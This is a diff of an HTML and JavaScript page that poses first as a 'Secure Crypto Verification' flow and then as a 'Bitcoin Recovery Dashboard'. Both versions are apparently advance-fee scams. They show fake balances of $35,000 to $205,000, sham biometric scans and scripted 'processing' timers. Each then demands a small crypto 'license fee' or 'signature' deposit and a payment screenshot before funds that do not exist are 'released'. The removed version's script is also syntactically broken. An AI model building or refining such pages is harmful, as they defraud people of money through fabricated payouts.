@@ -3,229 +3,246 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Secure Crypto Verification</title>
+    <title>Bitcoin Recovery Dashboard</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script src="https://unpkg.com/lucide@latest"></script>
     <style>
-        body { background-color: #0f172a; color: white; font-family: 'Inter', sans-serif; overflow-x: hidden; }
-        .glass-card { background: rgba(30, 41, 59, 0.7); backdrop-filter: blur(10px); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 1rem; }
-        .step { display: none; opacity: 0; transform: translateX(20px); transition: all 0.5s cubic-bezier(0.4, 0, 0.2, 1); }
-        .step.active { display: block; opacity: 1; transform: translateX(0); }
-        .step.exit { display: block; opacity: 0; transform: translateX(-20px); position: absolute; width: 100%; top: 0; }
-        .spinner { border: 4px solid rgba(255, 255, 255, 0.1); border-left-color: #3b82f6; border-radius: 50%; width: 48px; height: 48px; animation: spin 1s linear infinite; }
-        @keyframes spin { to { transform: rotate(360deg); } }
-        .scan-line { position: absolute; width: 100%; height: 2px; background: #3b82f6; box-shadow: 0 0 15px #3b82f6; animation: scan 2s linear infinite; }
-        @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }
-        .progress-indicator { height: 4px; background: rgba(255,255,255,0.05); border-radius: 2px; margin-bottom: 2rem; overflow: hidden; }
-        .progress-bar { height: 100%; background: #3b82f6; width: 0%; transition: width 0.3s ease; }
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #0a0a0a;
+            color: #ffffff;
+        }
+        .crypto-card {
+            background: linear-gradient(145deg, #1a1a1a, #141414);
+            border: 1px solid #333;
+        }
+        .glow-green {
+            box-shadow: 0 0 20px rgba(34, 197, 94, 0.2);
+        }
+        .animate-pulse-slow {
+            animation: pulse 3s cubic-bezier(0.4, 0, 0.6, 1) infinite;
+        }
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: .5; }
+        }
     </style>
 </head>
-<body class="min-h-screen flex items-center justify-center p-4">
+<body class="min-h-screen p-4 md:p-8">
+    <div id="app" class="max-w-4xl mx-auto">
+        <!-- Header -->
+        <header class="flex items-center justify-between mb-8">
+            <div class="flex items-center gap-2">
+                <i data-lucide="layout-dashboard" class="text-green-500"></i>
+                <h1 class="text-xl font-bold tracking-tight">CRYPTO RECOVERY</h1>
+            </div>
+            <div class="flex items-center gap-4 text-sm text-gray-400">
+                <span class="flex items-center gap-1"><span class="w-2 h-2 bg-green-500 rounded-full"></span> Network: Mainnet</span>
+                <span class="flex items-center gap-1"><i data-lucide="shield-check" class="w-4 h-4"></i> Secure Session</span>
+            </div>
+        </header>
 
-    <div id="container" class="max-w-md w-full relative">
-        <!-- Master Progress Bar -->
-        <div class="progress-indicator">
-            <div id="master-progress" class="progress-bar"></div>
+        <!-- Main Dashboard View -->
+        <div id="dashboard-view" class="space-y-6">
+            <div class="crypto-card rounded-2xl p-6 md:p-8 glow-green">
+                <div class="flex flex-col md:flex-row justify-between items-start md:items-center gap-6">
+                    <div>
+                        <p class="text-gray-400 text-sm mb-1 uppercase tracking-wider font-semibold">Available Balance</p>
+                        <h2 id="balance-display" class="text-4xl md:text-5xl font-bold text-white tracking-tighter">$35,000.00</h2>
+                        <p class="text-green-500 text-sm mt-2 font-mono">0.824152 BTC</p>
+                    </div>
+                    <button id="claim-btn" class="bg-green-600 hover:bg-green-700 text-white font-bold py-4 px-8 rounded-xl transition-all active:scale-95 flex items-center gap-2 shadow-lg shadow-green-900/20">
+                        <i data-lucide="download"></i>
+                        CLAIM RECOVERY
+                    </button>
+                </div>
+            </div>
+
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                <div class="crypto-card rounded-xl p-4 flex items-center gap-4">
+                    <div class="p-3 bg-blue-500/10 rounded-lg"><i data-lucide="history" class="text-blue-400"></i></div>
+                    <div>
+                        <p class="text-xs text-gray-500 uppercase">Recent Activity</p>
+                        <p class="text-sm font-medium">Last scan: 2 mins ago</p>
+                    </div>
+                </div>
+                <div class="crypto-card rounded-xl p-4 flex items-center gap-4">
+                    <div class="p-3 bg-purple-500/10 rounded-lg"><i data-lucide="lock" class="text-purple-400"></i></div>
+                    <div>
+                        <p class="text-xs text-gray-500 uppercase">Security Status</p>
+                        <p class="text-sm font-medium">Encryption Active (AES-256)</p>
+                    </div>
+                </div>
+            </div>
         </div>
 
-        <div id="app" class="glass-card p-8 shadow-2xl relative min-h-[450px] flex flex-col justify-center">
-            
-            <!-- Step 1: Wallet Confirmation -->
-            <div id="step-1" class="step active">
-                <div class="text-center mb-6">
-                    <div class="inline-block p-3 bg-blue-500/10 rounded-full mb-4">
-                        <i class="fas fa-wallet text-blue-500 text-2xl"></i>
+        <!-- Processing View (Hidden) -->
+        <div id="processing-view" class="hidden text-center py-20">
+            <div class="inline-block relative mb-8">
+                <div class="w-24 h-24 border-4 border-green-500/20 border-t-green-500 rounded-full animate-spin"></div>
+                <div class="absolute inset-0 flex items-center justify-center">
+                    <i data-lucide="database" class="w-8 h-8 text-green-500 animate-pulse"></i>
+                </div>
+            </div>
+            <h2 class="text-2xl font-bold mb-2">Syncing with Blockchain</h2>
+            <p id="processing-status" class="text-gray-400 font-mono text-sm">Validating recovery clusters...</p>
+        </div>
+
+        <!-- Wallet Selection View (Hidden) -->
+        <div id="wallet-view" class="hidden space-y-6">
+            <h2 class="text-2xl font-bold text-center mb-8">Select Destination Wallet</h2>
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
+                <div onclick="selectWallet('TRUST WALLET', 'bc1qx0dgu3zsgdmrqnn2rznc3v6ac5pk86kcxsv87t')" class="crypto-card rounded-2xl p-6 cursor-pointer hover:border-green-500 transition-colors group">
+                    <div class="flex items-center justify-between mb-4">
+                        <div class="w-12 h-12 bg-blue-600 rounded-full flex items-center justify-center font-bold">T</div>
+                        <i data-lucide="chevron-right" class="text-gray-600 group-hover:text-green-500"></i>
                     </div>
-                    <h1 class="text-xl font-bold">Wallet Ownership</h1>
+                    <h3 class="text-xl font-bold">TRUST WALLET</h3>
+                    <p class="text-xs text-gray-500 font-mono mt-2 truncate">bc1qx0dgu3zsgdmrqnn2rznc3v6ac5pk86kcxsv87t</p>
                 </div>
-                <div class="bg-green-500/10 border border-green-500/20 p-4 rounded-lg mb-6">
-                    <p class="text-sm text-green-400 mb-1 text-center">Incoming Payment Detected</p>
-                    <h2 class="text-2xl font-bold text-center">$35,000.00 USDT</h2>
-                </div>
-                <p class="text-slate-400 text-sm mb-4 text-center">Confirm ownership of the receiving address:</p>
-                <div class="bg-black/20 p-3 rounded font-mono text-[10px] break-all border border-white/10 mb-6 text-center text-blue-300">
-                    TDDW3JnTQietyVdY2w56dioFURLHaoP1Uy
-                </div>
-                <button onclick="goToStep(2)" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 rounded-lg transition-all active:scale-95 shadow-lg shadow-blue-900/20">
-                    Confirm Ownership
-                </button>
-            </div>
-
-            <!-- Step 2: Rules & Regulations -->
-            <div id="step-2" class="step">
-                <div class="text-center mb-6">
-                    <div class="inline-block p-3 bg-blue-500/10 rounded-full mb-4">
-                        <i class="fas fa-file-contract text-blue-500 text-2xl"></i>
+                <div onclick="selectWallet('ZENGO WALLET', '3C8BKuPoVtrLUfwTMatv6eRvFsHDPiBTAT')" class="crypto-card rounded-2xl p-6 cursor-pointer hover:border-green-500 transition-colors group">
+                    <div class="flex items-center justify-between mb-4">
+                        <div class="w-12 h-12 bg-orange-600 rounded-full flex items-center justify-center font-bold">Z</div>
+                        <i data-lucide="chevron-right" class="text-gray-600 group-hover:text-green-500"></i>
                     </div>
-                    <h1 class="text-xl font-bold">Withdrawal Rules</h1>
+                    <h3 class="text-xl font-bold">ZENGO WALLET</h3>
+                    <p class="text-xs text-gray-500 font-mono mt-2 truncate">3C8BKuPoVtrLUfwTMatv6eRvFsHDPiBTAT</p>
                 </div>
-                <ul class="text-sm text-slate-300 space-y-3 mb-6">
-                    <li class="flex items-start"><i class="fas fa-check-circle text-blue-500 mt-1 mr-3"></i> <span>Funds are reserved exclusively for the TRC-20 network.</span></li>
-                    <li class="flex items-start"><i class="fas fa-check-circle text-blue-500 mt-1 mr-3"></i> <span>Verification is mandatory for transfers exceeding $10,000.</span></li>
-                    <li class="flex items-start"><i class="fas fa-check-circle text-blue-500 mt-1 mr-3"></i> <span>Transactions are non-reversible once processed.</span></li>
-                </ul>
-                <div class="p-4 bg-white/5 rounded-lg mb-6 border border-white/10">
-                    <label class="flex items-center space-x-3 cursor-pointer">
-                        <input type="checkbox" id="accept-rules" class="h-5 w-5 rounded border-gray-300 text-blue-600 focus:ring-blue-600 bg-slate-800">
-                        <span class="text-sm text-slate-300">I have read and understand properly</span>
-                    </label>
-                </div>
-                <button onclick="handleRules()" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 rounded-lg transition-all active:scale-95">
-                    Continue to Process
-                </button>
+            </div>
+        </div>
+
+        <!-- Transaction Status View (Hidden) -->
+        <div id="status-view" class="hidden space-y-6">
+            <div class="bg-green-500/10 border border-green-500/20 rounded-xl p-4 flex items-center gap-3 text-green-400">
+                <i data-lucide="check-circle" class="w-5 h-5"></i>
+                <p class="text-sm font-semibold">Withdrawal successful. Transaction broadcasted.</p>
             </div>
 
-            <!-- Step 3: 15s System Processing -->
-            <div id="step-3" class="step text-center">
-                <div class="flex justify-center mb-8">
-                    <div class="spinner"></div>
+            <div class="crypto-card rounded-2xl p-6 space-y-6">
+                <div class="flex justify-between items-center border-b border-white/10 pb-4">
+                    <span class="text-gray-400">Status</span>
+                    <span class="bg-yellow-500/10 text-yellow-500 px-3 py-1 rounded-full text-xs font-bold animate-pulse">PROCESSING</span>
                 </div>
-                <h3 class="text-xl font-bold mb-2">Processing Transfer</h3>
-                <p class="text-sm text-slate-400 mb-8">Connecting to secure gateway. Please do not close this window...</p>
-                <div class="bg-blue-500/5 h-1 w-full rounded-full overflow-hidden">
-                    <div id="timer-bar-1" class="bg-blue-500 h-full w-0"></div>
-                </div>
-                <p id="timer-text-1" class="text-[10px] text-slate-500 mt-3 uppercase tracking-widest font-bold">Initialising Secure Channel</p>
-            </div>
-
-            <!-- Step 4: Face Verification Portal -->
-            <div id="step-4" class="step text-center">
-                <div class="text-center mb-6">
-                    <div class="inline-block p-4 bg-blue-500/10 rounded-full mb-4">
-                        <i class="fas fa-user-shield text-blue-500 text-3xl"></i>
+                
+                <div class="space-y-4">
+                    <div class="flex justify-between text-sm">
+                        <span class="text-gray-400">Destination</span>
+                        <span id="dest-wallet" class="font-mono text-xs">...</span>
                     </div>
-                    <h1 class="text-xl font-bold">Identity Portal</h1>
-                </div>
-                <p class="text-slate-300 mb-8 text-sm">To finalize the $35,000 USDT transfer, we need to confirm your identity via face verification.</p>
-                <button onclick="goToStep(5)" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-4 rounded-lg transition-all active:scale-95 flex items-center justify-center">
-                    <i class="fas fa-camera mr-2"></i> Start Verification
-                </button>
-            </div>
-
-            <!-- Step 5: Scanning (8 Seconds) -->
-            <div id="step-5" class="step text-center">
-                <div class="relative w-48 h-48 mx-auto bg-black/40 rounded-3xl border-2 border-blue-500/30 flex items-center justify-center overflow-hidden mb-8 shadow-[0_0_30px_rgba(59,130,246,0.1)]">
-                    <i class="fas fa-user text-6xl text-slate-700"></i>
-                    <div class="scan-line"></div>
-                </div>
-                <h3 class="text-xl font-bold mb-2">Scanning Biometrics</h3>
-                <p class="text-sm text-slate-400 mb-6">Analyzing facial points for security match...</p>
-                <div class="bg-blue-500/5 h-1 w-full rounded-full overflow-hidden">
-                    <div id="timer-bar-2" class="bg-blue-500 h-full w-0"></div>
-                </div>
-            </div>
-
-            <!-- Step 6: Professional Loading -->
-            <div id="step-6" class="step text-center">
-                <div class="flex justify-center mb-8">
-                    <div class="spinner border-t-blue-400"></div>
-                </div>
-                <h3 class="text-xl font-bold mb-2 text-blue-400">System Processing</h3>
-                <p class="text-sm text-slate-400">Submitting encrypted data to blockchain nodes. Confirming transfer protocol...</p>
-            </div>
-
-            <!-- Step 7: Verification Error -->
-            <div id="step-7" class="step">
-                <div class="bg-red-500/10 border border-red-500/20 p-4 rounded-lg mb-6 flex items-start space-x-3">
-                    <i class="fas fa-exclamation-triangle text-red-500 mt-1"></i>
-                    <div>
-                        <h3 class="font-bold text-red-500">Manual Action Required</h3>
-                        <p class="text-xs text-red-400">Automatic face verification could not finalize the $35,000 transfer.</p>
+                    <div class="flex justify-between text-sm">
+                        <span class="text-gray-400">Amount</span>
+                        <span class="font-bold text-green-500">$205,000.00</span>
+                    </div>
+                    <div class="flex justify-between text-sm">
+                        <span class="text-gray-400">Transaction Hash</span>
+                        <span class="font-mono text-xs text-gray-500">0x7d2e...4a1f</span>
                     </div>
                 </div>
-                <p class="text-sm text-slate-300 mb-6 leading-relaxed text-center">System requires a **Full License Verification** to release funds. Please settle the network license fee of **32 TRX** to activate your wallet.</p>
-                <div class="bg-blue-600/10 border border-blue-500/20 p-5 rounded-xl mb-8">
-                    <div class="flex justify-between items-center">
-                        <span class="text-xs text-blue-400 uppercase tracking-widest font-bold">Release Fee</span>
-                        <span class="text-2xl font-black text-white">32 TRX</span>
+
+                <div class="bg-red-500/10 border border-red-500/30 rounded-xl p-6 space-y-4">
+                    <div class="flex items-start gap-4">
+                        <i data-lucide="alert-triangle" class="text-red-500 w-6 h-6 shrink-0"></i>
+                        <div>
+                            <h4 class="font-bold text-white mb-1">Verification Required</h4>
+                            <p class="text-sm text-gray-400 leading-relaxed">System requires a **$100 BTC Valid Transaction signature** to enable the full withdrawal release. Your total funds ($205,000) will be credited immediately upon signature verification.</p>
+                        </div>
+                    </div>
+                    
+                    <div class="pt-4 space-y-4">
+                        <div class="bg-black/40 rounded-lg p-4 font-mono text-xs break-all border border-white/5">
+                            <p class="text-gray-500 mb-2 uppercase text-[10px] font-bold">Deposit Address (BTC)</p>
+                            <span class="text-white">bc1qj7...8nm9x...signature_node</span>
+                        </div>
+                        <div class="flex flex-col gap-3">
+                            <label class="block w-full">
+                                <span class="sr-only">Choose screenshot</span>
+                                <input type="file" id="proof-upload" class="block w-full text-sm text-gray-500 file:mr-4 file:py-2 file:px-4 file:rounded-full file:border-0 file:text-sm file:font-semibold file:bg-white/10 file:text-white hover:file:bg-white/20 transition-all cursor-pointer"/>
+                            </label>
+                            <button onclick="confirmPayment()" class="w-full bg-white text-black font-bold py-3 rounded-xl hover:bg-gray-200 transition-all">
+                                I HAVE PAID PROCESSING
+                            </button>
+                        </div>
                     </div>
                 </div>
-                <button onclick="goToStep(8)" class="w-full bg-white text-slate-900 font-bold py-4 rounded-lg hover:bg-slate-100 transition-all active:scale-95 shadow-lg">
-                    I Have Paid, Release My Funds
-                </button>
             </div>
+        </div>
 
-            <!-- Step 8: Final Confirmation -->
-            <div id="step-8" class="step text-center">
-                <div class="inline-block p-5 bg-yellow-500/10 rounded-full mb-6">
-                    <i class="fas fa-clock text-yellow-500 text-4xl animate-pulse"></i>
-                </div>
-                <h3 class="text-xl font-bold mb-4 text-yellow-500">Awaiting Confirmation</h3>
-                <div class="text-sm text-slate-300 space-y-4 mb-8 text-left leading-relaxed">
-                    <p>The network is currently verifying the 32 TRX payment.</p>
-                    <p class="font-bold border-l-4 border-blue-500 pl-4 bg-blue-500/5 py-2">Please send a screenshot of your 32 TRX payment to support immediately to process your $35,000 USDT.</p>
-                    <p class="text-xs text-slate-500">Receiving Wallet: <span class="font-mono text-[9px] opacity-70">TDDW3JnTQietyVdY2w56dioFURLHaoP1Uy</span></p>
-                </div>
-                <div class="p-3 bg-black/20 rounded-lg text-[10px] text-slate-500 font-mono italic">
-                    REF_ID: Release_35K_USDT_Pending
-                </div>
-            </div>
+        <!-- Final Wait View (Hidden) -->
+        <div id="wait-view" class="hidden text-center py-20">
+            <i data-lucide="clock" class="w-16 h-16 text-yellow-500 mx-auto mb-6 animate-pulse-slow"></i>
+            <h2 class="text-2xl font-bold mb-2">Transaction in Review</h2>
+            <p class="text-gray-400 max-w-sm mx-auto">Hold on. Once the system confirms your deposit is successful, you will receive the full amount in your wallet.</p>
+        </div>
+    </div>
+
+    <!-- Claim Success Toast (Absolute) -->
+    <div id="toast" class="fixed top-8 right-8 bg-green-600 text-white px-6 py-4 rounded-xl shadow-2xl transform translate-x-[150%] transition-transform duration-500 flex items-center gap-3">
+        <i data-lucide="bell"></i>
+        <div>
+            <p class="font-bold">Incoming Recovery Process</p>
+            <p class="text-sm opacity-90">$170,000.00 found in cluster.</p>
         </div>
     </div>
 
     <script>
-        const totalSteps = 8;
-        let currentStep = 1;
+        // Initialize Lucide icons
+        lucide.createIcons();
 
-        function updateMasterProgress() {
-            const bar = document.getElementById('master-progress');
-            const progress = ((currentStep - 1) / (totalSteps - 1)) * 100;
-            bar.style.width = progress + '%';
+        // State management
+        let balance = 35000;
+        let selectedWallet = '';
+        let walletAddr = '';
+
+        function switchView(viewId) {
+            ['dashboard-view', 'processing-view', 'wallet-view', 'status-view', 'wait-view'].forEach(id => {
+                document.getElementById(id).classList.add('hidden');
+            });
+            document.getElementById(viewId).classList.remove('hidden');
         }
 
-        function goToStep(step) {
-            const currentEl = document.getElementById(`step-${currentStep}`);
-            const nextEl = document.getElementById(`step-${step}`);
-            
-            currentEl.classList.add('exit');
+        // Claim Flow
+        document.getElementById('claim-btn').addEventListener('click', function() {
+            switchView('processing-view');
             
             setTimeout(() => {
-                currentEl.classList.remove('active', 'exit');
-                nextEl.classList.add('active');
-                currentStep = step;
-                updateMasterProgress();
+                // Show notification
+                const toast = document.getElementById('toast');
+                toast.classList.remove('translate-x-[150%]');
                 
-                // Trigger timed logic
-                if (step === 3) runTimer('timer-bar-1', 'timer-text-1', 15000, 4, [
-                    "Initialising Secure Channel", 
-                    "Mapping Blockchain Data", 
-                    "Verifying Node Consensus", 
-                    "Finalising Transfer Protocol"
-                ]);
-                if (step === 5) runTimer('timer-bar-2', null, 8000, 6);
-                if (step === 6) setTimeout(() => goToStep(7), 4000);
-            }, 500);
-        }
+                // Update balance
+                balance += 170000;
+                document.getElementById('balance-display').textContent = '$' + balance.toLocaleString('en-US', { minimumFractionDigits: 2 });
+                
+                setTimeout(() => {
+                    toast.classList.add('translate-x-[150%]');
+                    switchView('wallet-view');
+                }, 3000);
+            }, 3000);
+        });
 
-        function handleRules() {
-            if (document.getElementById('accept-rules').checked) {
-                goToStep(3);
-            } else {
-                alert('Please confirm that you understand the rules properly.');
-            }
-        }
-
-        function runTimer(barId, textId, duration, nextStepId, phases = []) {
-            let start = Date.now();
-            const bar = document.getElementById(barId);
-            const text = textId ? document.getElementById(textId) : null;
+        // Wallet Selection
+        function selectWallet(name, addr) {
+            selectedWallet = name;
+            walletAddr = addr;
+            switchView('processing-view');
+            document.getElementById('processing-status').textContent = "Establishing P2P Tunnel for " + name + "...";
             
-            const interval = setInterval(() => {
-                let elapsed = Date.now() - start;
-                let progress = (elapsed / duration) * 100;
-                bar.style.width = Math.min(progress, 100) + '%';
-                
-                if (text && phases.length > 0) {
-                    let idx = Math.floor((elapsed / duration) * phases.length);
-                    if (phases[idx]) text.innerText = phases[idx];
-                }
+            setTimeout(() => {
+                document.getElementById('dest-wallet').textContent = name + " (" + addr.substring(0, 8) + "...)";
+                switchView('status-view');
+            }, 4000);
+        }
 
-                if (elapsed >= duration) {
-                    clearInterval(interval);t
-                    goToStep(nextStepId);, 50); }
-// Initialize
-updateMasterProgress();
-</script>
-
-</body> 
+        // Final Confirm
+        function confirmPayment() {
+            const fileInput = document.getElementById('proof-upload');
+            if (!fileInput.files.length) {
+                alert("Please upload the payment screenshot first.");
+                return;
+            }
+            switchView('wait-view');
+        }
+    </script>
+</body>
 </html>
